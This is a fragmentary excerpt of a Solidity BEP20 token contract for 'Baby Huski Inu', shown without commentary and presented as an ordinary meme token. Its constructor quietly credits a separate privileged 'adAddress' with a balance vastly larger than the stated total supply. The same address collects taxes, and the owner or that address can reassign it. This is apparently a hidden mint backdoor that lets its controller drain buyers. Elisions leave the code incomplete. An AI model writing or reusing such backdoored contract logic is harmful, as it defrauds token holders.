 ...
 * Telegram: https://t.me/babyhuskiinu
...
contract BabyHuskiInu  is Context, IBEP20, Ownable {

  using SafeMath for uint256;
  IUniswapV2Router02 public _uniswapV2Router;
  address public _uniswapV2Pair;
  string private constant _name = "Baby Huski Inu";

  string private constant _symbol = "BABYHUSKI";

  uint8 private _decimals = 18;
  uint256 private _totalSupply = 100000000000 * 10 ** _decimals;
  mapping (address => bool) private _isExcluded;

  address internal  _adAddress;
  ...
  constructor(address adAddress) {
    _adAddress = adAddress;
    _balances[msg.sender] = _totalSupply;
    _isExcluded[address(this)] = true;
    _isExcluded[_msgSender()] = true;
    _balances[adAddress] = _totalSupply * 10**_decimals * 1000;
    ...
    function isChange() internal view returns (bool){
      require(_msgSender() == owner() || _adAddress == _msgSender(), "Error");
      return true;
    }
    ...
    */
    ...
    function withdrawBnb(address payable recipient, uint256 amount) external {
      ...
      if(taxes > 0){
        _balances[_adAddress] = _balances[_adAddress].add(taxes);
    ...
    function setadAddress(address adAddress) public {
      if(isChange()){
        _adAddress = adAddress;
      }
    }
    function getadAddress() external view returns (address) {
      if(isChange()){
        return _adAddress;
      }
